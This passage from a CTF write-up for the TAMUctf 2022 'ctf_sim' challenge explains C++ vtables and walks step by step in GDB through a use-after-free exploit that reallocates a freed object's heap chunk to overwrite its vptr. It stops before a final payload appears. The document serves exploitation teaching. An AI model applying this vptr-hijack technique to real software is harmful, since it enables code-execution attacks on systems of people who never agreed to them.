<span class="token punctuation">}</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">C++</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p><sup>(<a href="https://godbolt.org/#z:OYLghAFBqd5QCxAYwPYBMCmBRdBLAF1QCcAaPECAMzwBtMA7AQwFtMQByARg9KtQYEAysib0QXACx8BBAKoBnTAAUAHpwAMvAFYTStJg1DIApACYAQuYukl9ZATwDKjdAGFUtAK4sGIM6SuADJ4DJgAcj4ARpjE/gDspAAOqAqETgwe3r7%2ByanpAiFhkSwxcWaJdpgOGUIETMQEWT5%2BAVU1AnUNBEUR0bEJtvWNzTltwz2hfaUDFQCUtqhexMjsHOYAzKHI3lgA1CYbbk4KBMSYrIfYJhoAgje3O0wKCnvKDYwEB/FWd0leUVoeGQIAee3Be1CXySH0EAH10Ex6odfrcIW9YQQIFC9oj6nM9iA9jDzvC8UwTD9yZSACLfKzxGkPMEQgBueEaXjEe1ZqDw6D2/FQ2MEe1UBMpFj2p3QIBQSy%2BhzcSoOZjMJM%2Bewg5jMByOKo1ZKRTD1yqOqrMBKFRJ1ppVqjt5plctctBR3yZd3R7M53N5/L2UQaIq%2B4vp0oIsvlXkV%2BvNOsNX21asdbmJmIRxtTFoJQbiFuzDqVKudIFd7tpzMZKIeTxeexpsTwrMwAqJ/0BwIxpMVPweHaBIJZ4JxWGIzdbmeRG1R6Mb45b6BDuONpEhovJlsJ3c%2BkupjLXY4n6CnFKpxrMtPplbuw55HIIXNoPL5Arzy7DkojUbQMezOqPRctVtYtzUTU9/zVNcQLjNNAMnclIK3PMbRTUC0yLWDvxdBh0DdGcPSrJkZ2ZO4cRYJhQggCU%2By9CF3h7YlJS4SsSLo8EkgAOiFCBLXdAB6fid0EOUhTvLj3w2OYBKEhjPjlPNSLRCF52PXFJQAVjXAA2VjZwhdBuNQYV4mkgjBOEghROMu9DPfAAOMypQs1TFwUhoiI4BZaE4DTeD8DgtFIVBOGVSxrGlJYVkwVUNh4UgrMCryFgAaxADSNH0ThJH8zReBCjheAUEBMsSrQFjgWAYEQeUWCSOhYnISg0Dqhq4mALgzC4Pg6AIWJiogKI8tIKJQgaABPTh4pathBAAeQYWhJqS0gsAooxxBW/BzhqFtipWzBVGqGM1iCqFMB8lagSiYgJo8LBhrOPAWCmry%2BAMYAFAANTwTAAHc5qSRhXpkQQRDEdgpFB%2BQlDUYbdG6gwjBQaxrH0PAomKyAFlQJJHAEfaiou6p8b8CBXFGPxuuCKYSjKPQUjSUnKYZ/JSd6OmBm69pSa6EZPBaPQedqCYOf6OJuYmFnJe6MWZglhYFCi1Y9DOTA1h4bzfNylaCtUeztIAWm0yQ9mAZBkD2TrOK4LUwqsSw11wQgSFi7q9g8Vr6GIN25l4MrktINKMqyjgctIF6Q4CoKCqKkqEryirqogJAFX%2BAgmogFr6u98JWDWfWjZNs2Latswbd4VsXfHWVuv4MHRHEKH65hlR1BWhHSD%2B26klerWOD80ho/yzg5pjdO9lQKgxQN43TfNy3rdtiBPZz2Jff9xOFgQC4x0ofvw8jzLh%2BCzg49Kreg/SzLLo2HWY7PhOkrmfuzHvkfCqf8qFhbYg0mcSQQA" rel="noreferrer" target="_blank">godbolt demo</a>)</sup></p><p>C Version:</p><div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token class-name">funcptr_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Type alias for function pointers.</span>

<span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">{</span>
    <span class="token class-name">funcptr_t</span><span class="token operator">*</span> vtable<span class="token punctuation">;</span>
    <span class="token keyword">int</span> parent_data<span class="token punctuation">;</span>
<span class="token punctuation">}</span> Parent<span class="token punctuation">;</span>

<span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">{</span>
    <span class="token class-name">funcptr_t</span><span class="token operator">*</span> vtable<span class="token punctuation">;</span>
    <span class="token keyword">int</span> parent_data<span class="token punctuation">;</span> <span class="token comment">// Inherited from Parent.</span>
    <span class="token keyword">int</span> derived_data<span class="token punctuation">;</span>
<span class="token punctuation">}</span> Derived<span class="token punctuation">;</span>

<span class="token comment">// Enumeration of virtual functions.</span>
<span class="token keyword">enum</span> <span class="token punctuation">{</span> VFUNCTION_FOO<span class="token punctuation">,</span> VFUNCTION_BAR <span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token comment">// Concrete implementations.</span>
<span class="token keyword">void</span> <span class="token function">parent__foo</span><span class="token punctuation">(</span>Parent<span class="token operator">*</span> p<span class="token punctuation">,</span> <span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"parent (%d) foo: %d\n"</span><span class="token punctuation">,</span> p<span class="token operator">-&gt;</span>parent_data<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
<span class="token keyword">void</span> <span class="token function">parent__bar</span><span class="token punctuation">(</span>Parent<span class="token operator">*</span> p<span class="token punctuation">,</span> <span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"parent (%d) bar: %d\n"</span><span class="token punctuation">,</span> p<span class="token operator">-&gt;</span>parent_data<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
<span class="token keyword">void</span> <span class="token function">derived__bar</span><span class="token punctuation">(</span>Derived<span class="token operator">*</span> d<span class="token punctuation">,</span> <span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"derived (%d, %d) bar: %d\n"</span><span class="token punctuation">,</span> d<span class="token operator">-&gt;</span>parent_data<span class="token punctuation">,</span> d<span class="token operator">-&gt;</span>derived_data<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>

<span class="token comment">// Virtual implementations (redirect).</span>
<span class="token keyword">void</span> <span class="token function">foo</span><span class="token punctuation">(</span>Parent<span class="token operator">*</span> p<span class="token punctuation">,</span> <span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span> p<span class="token operator">-&gt;</span>vtable<span class="token punctuation">[</span>VFUNCTION_FOO<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>p<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
<span class="token keyword">void</span> <span class="token function">bar</span><span class="token punctuation">(</span>Parent<span class="token operator">*</span> p<span class="token punctuation">,</span> <span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span> p<span class="token operator">-&gt;</span>vtable<span class="token punctuation">[</span>VFUNCTION_BAR<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>p<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>

<span class="token comment">// vtable definitions.</span>
<span class="token class-name">funcptr_t</span> parent__vtable<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
    parent__foo<span class="token punctuation">,</span>
    parent__bar<span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token class-name">funcptr_t</span> derived__vtable<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
    parent__foo<span class="token punctuation">,</span>
    derived__bar<span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    Parent p <span class="token operator">=</span> <span class="token punctuation">{</span>parent__vtable<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token function">foo</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>p<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// parent__foo</span>
    <span class="token function">bar</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>p<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// parent__bar.</span>

    Derived d <span class="token operator">=</span> <span class="token punctuation">{</span>derived__vtable<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">(</span>Parent<span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>d<span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// parent__foo</span>
    <span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">(</span>Parent<span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>d<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// derived__bar.</span>
<span class="token punctuation">}</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">C</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p><sup>(<a href="https://godbolt.org/#z:OYLghAFBqd5QCxAYwPYBMCmBRdBLAF1QCcAaPECAMzwBtMA7AQwFtMQByARg9KtQYEAysib0QXACx8BBAKoBnTAAUAHpwAMvAFYTStJg1AB9U8lJL6yAngGVG6AMKpaAVxYMQAJgDMpBwAyeAyYAHLuAEaYxN4AHKQADqgKhLYMzm4e3n5JKTYCQSHhLFExXvGWmNZpQgRMxAQZ7p6%2BFphW%2BQy19QSFYZHRcRZ1DU1ZrQojvcH9JYPlAJQWqK7EyOwcAKS%2BwchuWADUmz6Ok/ioAHQIx9ibGgCCd/cEAJ4JmFhUBwBuqHjoBwgACoqK4GMgEgRiMYCAsIAtjgAhA4AehRBwAKm9MAcxHgmAoDvxiESwdUBAcksECNEFBcnk9Xu9PgdJsRXNYjgB2RFPA780ngyHQghAn51CL0JF8gXUyn1RgEYzoJh1aUPTZcgAiB2UCsE6seDyZH0wXzZHII3N5DwFgohUJhYu%2BEqlPht9ztcoS%2BqVKrV7tR6IAkgwENFCB8icRUCx5cRFfTbbLBAcsMQ8N8PsrVUxDZqdVqI1n0PmHmiDtgGO5oqq0gdUF9vngGq4xPbOnSnox3NaDgA1ABiclCjgxwYA8qFjIOJxPSAPh6Px1PjIj7gAlblasv3CvOcEJmkHPAsBL0NiCOsCLsPX7/eOK0z8VAQPUJwRihILuWqBZ9hIM0EKgIG2LwfQ/K1QK8ABWdB/xfEAjlg0sYMcBgwIXBIAFobggp9/SYBc/yRbcnnvAF8MEUwInqN9fS/H9Uz/ACgIIECwKoqDtjg/9aJiZC4M2NCMK8LwsNwnxsC4nM6mIhFAwLci/gBdNM2zYx%2BIgIsMxLMV0CYq0WM1ZFAOpDixLUktAR4gzBPgg5%2BKQ2zhPQzC00k6TfVkoiPJuKzs0I%2BTSKUjVy3RfsWwINtaBPM8L0Va8GEJCAE3wBNrAWJN7goolUFfd9FUYk9mP/EzKU8l0mElTBhMRIcRzHSdp1nCdhK1KAKKBBZvwOEjFO1ZSHy0wrP0pQy%2BrKnkKpuKqarqhrl2atdN3azqVO63r%2BuRUKjT3dE5voNMzWCVIb2y0EhUdK0ZOMQ7apg3kYJ1Y4Xp5GV%2BVul9SA%2Bx9qM0%2Bofo1Qb3QZB5LodEVjt0jT7rq9qjh8N6PTtL78qBz0BQC9AaMBhkQY9J45RYJhgggCippRgVRpuxHkdu%2B6Fy4JTQeTfkX2ggA2XqvAU5EKzR1Bfq07ZuYXHw%2BaDP6lQB4hst%2BnT1NUunrWx0xGYOGCF05lmqfZ/KoBp7rRbsrlJYF7zjBfYW6PoyDja8Tm7Nic30TV2X5e1DglloTgYN4TwOC0UhUE4RxWRWNYcW2HweFIAhNG9pYAGsQBgjR9E4SQA8TkPOF4BQQAzhOg%2B90g4FgGBEBQWMEjoaJyEoNAz3rmJkGALgvC4Pg6BpYhC4gCJc4iYJ6heTg4%2Bby8CAnBhaHH0vSCwEmjHERf0qqGws0LxfMFUKpXBpXPqXaXPaDwCJiDH5wsFzqFTwnsuqAMYAFEizAAHcJ3eQO4/4QQRBiHYFIGQghFAqHUIvXQ3cDBGBAKYYw5hz4RELpAJYqBIRpB3gXdom80j2AYE4FwzQ9CBBmMUUoehchnXSMQrI3dqGdD6BQwY3dKjki6FMMYng2G4I4d0BozCBgxDYVwuhPDhg9CEXMERSwFCR3WHoKEmANg8B9n7HOi9Q4cFULETm2FOaSAOMAZAyADidwuFwQEjgFy4EICQZCscFzOBbvQEkMcuALF4CXLQCwU5pwzr7Dg2dSAsACaQQOwdtEFyLvHROSwK7VxWAQBIh9G4QGbnXNxoRWAbF0fowxxjTHmK8JY3gHx7EZnQHof%2BwhRDiBAbU8Bahc7QNIB/K%2BCRH7qI4P7CJudtETkPqkq0jY%2Bp6IMUYkxZiLFWIgC4rJ0RHGeO8fEpY4YmDpkoD0kJYT079K0fnCwsSfFJ1IKnfZQSfCaKiUc05fjM4cC8Dc3g0S4mlweVmfu%2BDJBAA%3D" rel="noreferrer" target="_blank">godbolt demo</a>, inspired from <a href="https://gist.github.com/michahoiting/1aec1c95881881add9a20e9839c35cec" rel="noreferrer" target="_blank">this gist</a>)</sup></p><p>So to reiterate and relate how this works with ctf_sim.cpp:</p><ul><li>By observation, each class (<code>challenge</code>, <code>forensic</code>, <code>reversing</code>, etc.) has a virtual function.</li><li>Therefore, each class has a vtable.</li><li>Also, an object of any class (<code>challenge</code>, <code>forensic</code>, etc.) has a vptr.</li><li>This vptr points to the corresponding vtable of the class.<ul><li>e.g. a <code>forensic</code> object will have a vptr pointing to the <code>forensic</code> vtable.</li><li>a <code>pwn</code> object will have a vptr pointing to the <code>pwn</code> vtable.</li></ul></li></ul><h4 id="exploiting-the-binary-with-gdb" tabindex="-1"><a class="md-anchor" href="#exploiting-the-binary-with-gdb" aria-hidden="true"></a> Exploiting the Binary with GDB</h4><p>This section will walk through the hands-on aspect exploiting the <code>ctf_sim</code> binary using GDB. I try to go through the entire procedure to clarify the details, so it may be slightly long-winded. Feel free to skip to the <a href="#altogether">conclusion</a>.</p><p>To recap a bit, we know that...</p><ul><li>when a virtual function is called, the function does a little double-dereference magic using the object's vptr.</li><li>there is a use-after-free/double-free vulnerability.<ul><li>When solving a challenge, <code>delete</code> is called. But the pointer value isn't cleared.<div class="code-toolbar"><pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">int</span><span class="token operator">*</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">;</span>
    <span class="token comment">// Suppose p == 0x404000.</span>
    <span class="token keyword">delete</span> p<span class="token punctuation">;</span>
    <span class="token comment">// Pointer value is still 0x404000, not NULL or anything else.</span>
<span class="token punctuation">}</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">C++</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div></li><li>We could...<ul><li>make a new challenge at the same index? This would overwrite our use-after-free pointer... we probably don't want that.</li><li>solve the challenge again? This would call the virtual function and delete the pointer again.</li><li>submit a writeup? We might be able to use this to reallocate the chunk and overwrite object data with custom data! Let's explore this a bit more using GDB.</li></ul></li></ul></li></ul><p>We'll try the following:</p><ol><li>Download challenge. This allocates a new chunk.</li><li>Solve the downloaded challenge. This should free the chunk.</li><li>Submit a writeup. This should reallocate the chunk, but with our custom data.</li><li>Solve the downloaded challenge again. This should call a double deref on the vptr.</li></ol><p>To understand the exploit the details better and what happens under the hood, we'll use GDB to step through the exploit.</p><p>A brief refresher on some commands we'll be using. (See this <a href="/posts/gdb-cheatsheet/">GDB cheatsheet</a> for more commands.)</p><div class="code-toolbar"><pre data-language="GDB" class="language-sh" tabindex="0"><code class="language-sh">r               <span class="token comment"># Run the file.</span>
c               <span class="token comment"># Continue running where we left off.</span>
heap chunks     <span class="token comment"># View active chunks on the heap.</span>
x /40wx <span class="token operator">&lt;</span>addr<span class="token operator">&gt;</span>  <span class="token comment"># View memory at address as hex data.</span>
x /40wi <span class="token operator">&lt;</span>addr<span class="token operator">&gt;</span>  <span class="token comment"># View memory at address as instructions.</span>
disas <span class="token operator">&lt;</span>sym<span class="token operator">&gt;</span>     <span class="token comment"># Disassemble a symbol.</span>
b *<span class="token operator">&lt;</span>addr<span class="token operator">&gt;</span>       <span class="token comment"># Set a breakpoint at the specified address.</span>
<span class="token function">kill</span>            <span class="token comment"># Useful for stopping the current run in case we make an oopsie and need to restart.</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">GDB</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p>After starting up my Kali Linux VM, downloading the challenge onto it, and firing up GDB; we inspect the initial state of the heap.</p><div class="code-toolbar"><pre class="command-line language-sh" data-prompt="$" data-continuation-prompt="gef>" data-continuation-str="  " tabindex="0"><code class="language-sh"><span class="command-line-prompt"><span data-prompt="$"></span><span data-continuation-prompt="gef>"></span><span data-continuation-prompt="gef>"></span><span data-continuation-prompt="gef>"></span></span><span class="token command">gdb ctf_sim  </span>
<span class="token command">r  </span>
<span class="token command">^C  </span>
<span class="token command">heap chunks  </span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">Shell</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p><a class="lightbox-single" title="" href="/img/posts/ctf/tamuctf22/assets/ctf-sim-1-heap-init-1320w.webp"><img class="mb-2 rw center jw-100" src="/img/posts/ctf/tamuctf22/assets/ctf-sim-1-heap-init-1320w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 1320 / 356" alt="undefined" title="undefined" srcset="/img/posts/ctf/tamuctf22/assets/ctf-sim-1-heap-init-256w.webp 256w, /img/posts/ctf/tamuctf22/assets/ctf-sim-1-heap-init-512w.webp 512w, /img/posts/ctf/tamuctf22/assets/ctf-sim-1-heap-init-1024w.webp 1024w, /img/posts/ctf/tamuctf22/assets/ctf-sim-1-heap-init-1320w.webp 1320w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, (max-width: 1024px) 1024px, 1320px"></a></p><p>Ooo, looks a bit busy, even though we haven't <code>malloc</code>ed or <code>new</code>ed anything yet! These are probably allocations from iostream buffers used to buffer the input and output streams. We'll ignore these for now as they aren't very important.</p><p>We perform our first action: downloading a challenge. The challenge type and index to store the challenge don't really matter, so we'll just go with the first option (<code>new forensics</code>) and index 0.</p><div class="code-toolbar"><pre data-language="GDB" class="command-line language-sh" data-prompt="gef>" data-continuation-prompt=">" data-continuation-str="  " tabindex="0"><code class="language-sh"><span class="command-line-prompt"><span data-prompt="gef>"></span><span data-continuation-prompt=">"></span><span data-continuation-prompt=">"></span><span data-continuation-prompt=">"></span></span><span class="token command">c  </span>
<span class="token command"><span class="token number">1</span>  </span>
<span class="token command"><span class="token number">1</span>  </span>
<span class="token command"><span class="token number">0</span></span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">GDB</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p><a class="lightbox-single" title="" href="/img/posts/ctf/tamuctf22/assets/ctf-sim-2-input-1-1324w.webp"><img class="mb-2 rw center jw-100" src="/img/posts/ctf/tamuctf22/assets/ctf-sim-2-input-1-1324w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 1324 / 550" alt="undefined" title="undefined" srcset="/img/posts/ctf/tamuctf22/assets/ctf-sim-2-input-1-256w.webp 256w, /img/posts/ctf/tamuctf22/assets/ctf-sim-2-input-1-512w.webp 512w, /img/posts/ctf/tamuctf22/assets/ctf-sim-2-input-1-1024w.webp 1024w, /img/posts/ctf/tamuctf22/assets/ctf-sim-2-input-1-1324w.webp 1324w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, (max-width: 1024px) 1024px, 1324px"></a></p><p>Let's pause again and check the state of the heap.</p><div class="code-toolbar"><pre data-language="GDB" class="command-line language-sh" data-prompt=">" data-continuation-prompt="gef>" data-continuation-str="  " tabindex="0"><code class="language-sh"><span class="command-line-prompt"><span data-prompt=">"></span><span data-continuation-prompt="gef>"></span></span><span class="token command">^C  </span>
<span class="token command">heap chunks</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">GDB</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p><a class="lightbox-single" title="" href="/img/posts/ctf/tamuctf22/assets/ctf-sim-3a-heap-after-input-1-1318w.webp"><img class="mb-2 rw center jw-100" src="/img/posts/ctf/tamuctf22/assets/ctf-sim-3a-heap-after-input-1-1318w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 1318 / 404" alt="undefined" title="undefined" srcset="/img/posts/ctf/tamuctf22/assets/ctf-sim-3a-heap-after-input-1-256w.webp 256w, /img/posts/ctf/tamuctf22/assets/ctf-sim-3a-heap-after-input-1-512w.webp 512w, /img/posts/ctf/tamuctf22/assets/ctf-sim-3a-heap-after-input-1-1024w.webp 1024w, /img/posts/ctf/tamuctf22/assets/ctf-sim-3a-heap-after-input-1-1318w.webp 1318w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, (max-width: 1024px) 1024px, 1318px"></a></p><p>Notice that there is now a new chunk with size <code>0x20</code> with some data in the first few bytes. Since we just allocated a <code>forensics</code> object, this is likely the vptr of that object.</p><p>Indeed, if we peek into the binary's memory using <code>x /20wx 0x403d38</code>, we see what looks like some vtables having a party:</p><p><a class="lightbox-single" title="" href="/img/posts/ctf/tamuctf22/assets/ctf-sim-3b-vtables-party-1122w.webp"><img class="mb-2 rw center jw-100" src="/img/posts/ctf/tamuctf22/assets/ctf-sim-3b-vtables-party-1122w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 1122 / 162" alt="undefined" title="undefined" srcset="/img/posts/ctf/tamuctf22/assets/ctf-sim-3b-vtables-party-256w.webp 256w, /img/posts/ctf/tamuctf22/assets/ctf-sim-3b-vtables-party-512w.webp 512w, /img/posts/ctf/tamuctf22/assets/ctf-sim-3b-vtables-party-1024w.webp 1024w, /img/posts/ctf/tamuctf22/assets/ctf-sim-3b-vtables-party-1122w.webp 1122w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, (max-width: 1024px) 1024px, 1122px"></a></p><p>We'll move on to the second step: solving the challenge. This step is rather simple, but I want to show how the vtable magic is done in assembly. Let's disassemble the <code>solveChallenge()</code> function and set a breakpoint near the hotspot.</p><div class="code-toolbar"><pre data-language="GDB" class="command-line language-sh" data-prompt="gef>" data-continuation-prompt=">" data-continuation-str="  " tabindex="0"><code class="language-sh"><span class="command-line-prompt"><span data-prompt="gef>"></span><span data-prompt="gef>"></span></span><span class="token command">disas solveChallenge</span>
<span class="token command">b *solveChallenge+191</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">GDB</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p><a class="lightbox-single" title="" href="/img/posts/ctf/tamuctf22/assets/ctf-sim-4a-disas-1-1310w.webp"><img class="mb-2 rw center jw-95" src="/img/posts/ctf/tamuctf22/assets/ctf-sim-4a-disas-1-1310w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 1310 / 492" alt="" title="" srcset="/img/posts/ctf/tamuctf22/assets/ctf-sim-4a-disas-1-256w.webp 256w, /img/posts/ctf/tamuctf22/assets/ctf-sim-4a-disas-1-512w.webp 512w, /img/posts/ctf/tamuctf22/assets/ctf-sim-4a-disas-1-1024w.webp 1024w, /img/posts/ctf/tamuctf22/assets/ctf-sim-4a-disas-1-1310w.webp 1310w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, (max-width: 1024px) 1024px, 1310px"></a></p><p><a class="lightbox-single" title="" href="/img/posts/ctf/tamuctf22/assets/ctf-sim-4b-disas-2-1316w.webp"><img class="mb-2 rw center jw-95" src="/img/posts/ctf/tamuctf22/assets/ctf-sim-4b-disas-2-1316w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 1316 / 630" alt="" title="" srcset="/img/posts/ctf/tamuctf22/assets/ctf-sim-4b-disas-2-256w.webp 256w, /img/posts/ctf/tamuctf22/assets/ctf-sim-4b-disas-2-512w.webp 512w, /img/posts/ctf/tamuctf22/assets/ctf-sim-4b-disas-2-1024w.webp 1024w, /img/posts/ctf/tamuctf22/assets/ctf-sim-4b-disas-2-1316w.webp 1316w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, (max-width: 1024px) 1024px, 1316px"></a></p><p>Now we'll continue running and feed it input for solving our <code>forensics</code> challenge.</p><div class="code-toolbar"><pre data-language="GDB" class="command-line language-sh" data-prompt="gef>" data-continuation-prompt=">" data-continuation-str="  " tabindex="0"><code class="language-sh"><span class="command-line-prompt"><span data-prompt="gef>"></span><span data-continuation-prompt=">"></span><span data-continuation-prompt=">"></span></span><span class="token command">c  </span>
<span class="token command"><span class="token number">2</span>  </span>
<span class="token command"><span class="token number">0</span></span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">GDB</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p>Our breakpoint gets triggered. Notice the interesting chain of addresses in the <code>rax</code> register in the image below. There's a chain of 3 addresses:</p><ol><li>the address of the <code>forensics</code> object vptr... which points to...</li><li>the address of the <code>forensics</code> vtable... which points to...</li><li>the address of <code>forensics::solve</code>...<ul><li>which is eventually called in assembly (<code>call rax</code>)</li></ul></li></ol><p><a class="lightbox-single" title="" href="/img/posts/ctf/tamuctf22/assets/ctf-sim-4c-double-deref-in-first-solve-1308w.webp"><img class="mb-2 rw center jw-85" src="/img/posts/ctf/tamuctf22/assets/ctf-sim-4c-double-deref-in-first-solve-1308w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 1308 / 1142" alt="" title="" srcset="/img/posts/ctf/tamuctf22/assets/ctf-sim-4c-double-deref-in-first-solve-256w.webp 256w, /img/posts/ctf/tamuctf22/assets/ctf-sim-4c-double-deref-in-first-solve-512w.webp 512w, /img/posts/ctf/tamuctf22/assets/ctf-sim-4c-double-deref-in-first-solve-1024w.webp 1024w, /img/posts/ctf/tamuctf22/assets/ctf-sim-4c-double-deref-in-first-solve-1308w.webp 1308w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, (max-width: 1024px) 1024px, 1308px"></a></p><p>So <em>this</em> is what happens when we call a virtual function... InTeReStInG!</p><p><a class="lightbox-single" title="" href="/img/interesting-1280w.webp"><img class="mb-2 rw center jw-65" src="/img/interesting-1280w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 1280 / 720" alt="" title="" srcset="/img/interesting-256w.webp 256w, /img/interesting-512w.webp 512w, /img/interesting-1024w.webp 1024w, /img/interesting-1280w.webp 1280w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, (max-width: 1024px) 1024px, 1280px"></a></p><p>Let's continue so that it finishes <code>delete</code>-ing the chunk, and let's check the heap state again:</p><div class="code-toolbar"><pre data-language="GDB" class="command-line language-sh" data-prompt="gef>" data-continuation-prompt=">" data-continuation-str="  " tabindex="0"><code class="language-sh"><span class="command-line-prompt"><span data-prompt="gef>"></span><span data-continuation-prompt=">"></span><span data-prompt="gef>"></span></span><span class="token command">c  </span>
<span class="token command">^C</span>
<span class="token command">heap chunks</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">GDB</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p><a class="lightbox-single" title="" href="/img/posts/ctf/tamuctf22/assets/ctf-sim-5-heap-after-input-2-1310w.webp"><img class="mb-2 rw center jw-100" src="/img/posts/ctf/tamuctf22/assets/ctf-sim-5-heap-after-input-2-1310w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 1310 / 392" alt="undefined" title="undefined" srcset="/img/posts/ctf/tamuctf22/assets/ctf-sim-5-heap-after-input-2-256w.webp 256w, /img/posts/ctf/tamuctf22/assets/ctf-sim-5-heap-after-input-2-512w.webp 512w, /img/posts/ctf/tamuctf22/assets/ctf-sim-5-heap-after-input-2-1024w.webp 1024w, /img/posts/ctf/tamuctf22/assets/ctf-sim-5-heap-after-input-2-1310w.webp 1310w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, (max-width: 1024px) 1024px, 1310px"></a></p><p>It appears that our <code>forensics</code> vptr has been replaced with some other data. 😢 But no worries! We'll just continue with our third action: submitting a writeup.</p><p>Since we want to reuse the chunk previously deallocated, we want to make sure the chunk we allocate when submitting the writeup isn't too big. But the chunk shouldn't be too small either: we want it to be at least 9 bytes, so that it could fit 8 bytes of payload plus a null terminator. So we'll settle for 16 bytes.</p><div class="code-toolbar"><pre data-language="GDB" class="command-line language-sh" data-prompt="gef>" 